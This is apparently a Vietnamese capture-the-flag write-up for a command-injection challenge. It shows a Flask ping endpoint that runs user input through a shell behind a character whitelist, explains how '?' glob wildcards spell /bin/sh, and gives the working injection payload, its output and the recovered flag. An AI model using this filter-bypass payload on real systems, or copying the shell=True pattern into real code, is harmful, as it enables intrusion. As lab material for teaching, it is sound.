# Solve on local first because on remote have captcha On remote it will replace all v1t{fake_flag} with real flag. Flag on the source code, sorry for the earlier chall was unintended :<

Đây là 1 thử thách liên quan đến command injection tuy nhiên tác giả đã bypass hết tất cả các dấu mà người chơi có thể dùng

    ALLOWED_TARGET_RE = re.compile(r"^(?!.* \.)(?!.*\. )[i0-9.;?/ ]+$")

    @app.route("/", methods=["GET", "POST"])
def index():
    output = ""
    target = ""

    if request.method == "POST":
        target = request.form.get("target", "")
        lowered_target = target.lower()

        if not ALLOWED_TARGET_RE.fullmatch(target):
            output = "Only host-like characters are allowed"
            return render_template("index.html", output=output, target=target)

        if any(token in lowered_target for token in BLOCKED_TOKENS):
            output = "Blocked by filter"
            return render_template("index.html", output=output, target=target)

        try:
            command = f"ping -c 1 {target}"
            output = subprocess.check_output(
                command,
                shell=True,
                stderr=subprocess.STDOUT,
                timeout=5,
                text=True,
                env={"PATH": "/bin:/usr/bin"},
            )
        except subprocess.CalledProcessError as exc:
            output = exc.output
        except subprocess.TimeoutExpired:
            output = "Command timed out"

    return render_template("index.html", output=output, target=target)


    [i0-9.;?/ ]+

Nhìn vào trong đoạn regex ở trên, có thể thấy người chơi chỉ được phép dùng các dấu như ; i . ? / và dấu cách cùng với đó là các số, cùng với đó, nó chỉ hoạt động trong đường dẫn /bin/sh. Nhìn lại việc chỉ có dấu được cho phép thì có thể dùng dấu ? thay cho các chữ cái trừ chữ i như kiểu:

    /bin/sh : /?i?/??

Ngoài ra nhìn vào dòng TODO trong app.py có đoạn 

    - The challenge is currently not solvable because:
    - flag.txt has incorrect permissions.
    - flag.py should print(FLAG) not 'FLAG'.

    - Fix the deployment files before expecting a valid solve path.

    - The SHA-256 hash of v1t{fake_flag} is not realistically brute-forceable,
     so the init Bash script also needs to be fixed.

flag.txt có tồn tại nhưng không vào được còn flag.py có vào được nhưng lại lỗi cú pháp logic 

Thử với payload để vào flag.py

    8.8.8.8; /?i?/?? ????.??

    PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
    64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=24.3 ms

    --- 8.8.8.8 ping statistics ---
    1 packets transmitted, 1 received, 0% packet loss, time 0ms
    rtt min/avg/max/mdev = 24.341/24.341/24.341/0.000 ms
    app.py: 12: 
    TODO / Deployment fixes

    - The challenge is currently not solvable because:
    - flag.txt has incorrect permissions.
    - flag.py should print(FLAG) not 'FLAG'.

    - Fix the deployment files before expecting a valid solve path.

    - The SHA-256 hash of v1t{br0_th15_15_duck} is not realistically brute-forceable,
     so the init Bash script also needs to be fixed.
    : not found
    
Flag: v1t{br0_th15_15_duck}